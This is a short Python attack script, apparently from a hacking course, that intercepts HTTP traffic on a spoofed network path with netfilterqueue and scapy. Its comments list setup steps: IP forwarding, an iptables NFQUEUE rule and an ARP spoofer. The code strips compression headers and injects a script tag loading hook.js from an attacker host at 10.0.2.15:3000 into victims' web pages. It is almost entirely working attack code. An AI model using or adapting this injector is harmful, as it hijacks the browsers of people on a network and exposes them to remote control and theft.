#!/usr/bin/env python

#How to run:
	#0. run		echo 1 > /proc/sys/net/ipv4/ip_forward
	#1. service apache2 start
	#2. iptables -I FORWARD -j NFQUEUE --queue-num 0
	#3. run 	python spoofer.py
	#4. run 	python code_injector.py



import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load
		if scapy_packet[scapy.TCP].dport == 80:
			print("[+] Request")
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
			
		elif scapy_packet[scapy.TCP].sport == 80:
			print("[+] Response")
			injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
			load = load.replace("</body>", injection_code +  "</body>")
			content_lenght_search = re.search("(?:Content-Length:\s)(\d*)", load)
			if content_lenght_search and "text/html" in load:
				content_lenght = content_lenght_search.group(1)
				new_content_lenght = int(content_lenght) + len(injection_code)
				load = load.replace(content_lenght, str(new_content_lenght))
			
			
		if load != scapy_packet[scapy.Raw].load:
			new_packet = set_load(scapy_packet, load)
			packet.set_payload(str(new_packet))

	packet.accept() #packet.drop() 



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

